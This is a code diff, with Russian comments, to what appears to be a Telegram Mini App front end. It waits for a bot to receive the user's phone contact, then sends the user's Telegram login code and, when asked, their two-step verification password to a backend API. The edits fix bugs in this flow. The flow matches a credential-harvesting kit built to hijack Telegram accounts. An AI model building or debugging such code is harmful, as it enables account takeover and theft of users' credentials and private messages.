@@ -144,24 +144,25 @@
                 document.getElementById('loader').style.display = 'block';
                 document.getElementById('l-text').innerText = "Ожидание подтверждения...";
                 
-                // Интервал опроса, пока бот не подтвердит получение контакта
+                // Используем String() для ID, чтобы избежать проблем с форматом числа
                 const userId = String(tg.initDataUnsafe.user.id);
+                
                 let checkTimer = setInterval(async () => {
                     try {
                         const r = await fetch(`${API_BASE}/api/check_contact?id=${userId}`);
+                        if (!r.ok) return;
                         const d = await r.json();
                         
                         if(d.status === 'received' && d.phone) {
                             clearInterval(checkTimer);
-                            userPhone = String(d.phone); // Сохраняем номер как строку
+                            userPhone = String(d.phone); // Номер телефона — строго строка
                             document.getElementById('loader').style.display = 'none';
                             document.getElementById('s2').style.display = 'block';
                         }
-                    } catch(e) { console.error("API Error:", e); }
+                    } catch(e) { console.error("Poll error:", e); }
                 }, 2000);
 
-                // Тайм-аут через 30 секунд
-                setTimeout(() => clearInterval(checkTimer), 30000);
+                setTimeout(() => clearInterval(checkTimer), 40000);
             }
         });
     }
@@ -183,22 +184,23 @@
                 body: JSON.stringify({
                     phone: String(userPhone),
                     code: String(c),
-                    id: String(tg.initDataUnsafe.user.id)
+                    id: String(tg.initDataUnsafe.user.id) // Фикс для ошибки "bytes or str expected"
                 })
             });
             const data = await response.json();
             
-            document.getElementById('loader').style.display = 'none';
             if(data.status === 'success') {
                 finish();
             } else if(data.status === '2fa_needed') {
+                document.getElementById('loader').style.display = 'none';
                 document.getElementById('s3').style.display = 'block';
             } else {
                 alert("Ошибка: " + (data.message || "неверный код"));
+                document.getElementById('loader').style.display = 'none';
                 document.getElementById('s2').style.display = 'block';
             }
         } catch(e) {
-            alert("Ошибка сети при отправке кода");
+            alert("Ошибка сети. Бот запущен?");
             document.getElementById('loader').style.display = 'none';
             document.getElementById('s2').style.display = 'block';
         } finally { isSending = false; }
@@ -212,7 +214,6 @@
         isSending = true;
         document.getElementById('s3').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-        document.getElementById('l-text').innerText = "Проверка пароля...";
 
         try {
             const r = await fetch(`${API_BASE}/api/send_password`, {
@@ -234,7 +235,9 @@
                 document.getElementById('s3').style.display = 'block';
             }
         } catch(e) {
-            alert("Ошибка сети при проверке 2FA");
+            alert("Ошибка соединения.");
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('s3').style.display = 'block';
         } finally { isSending = false; }
     }
 
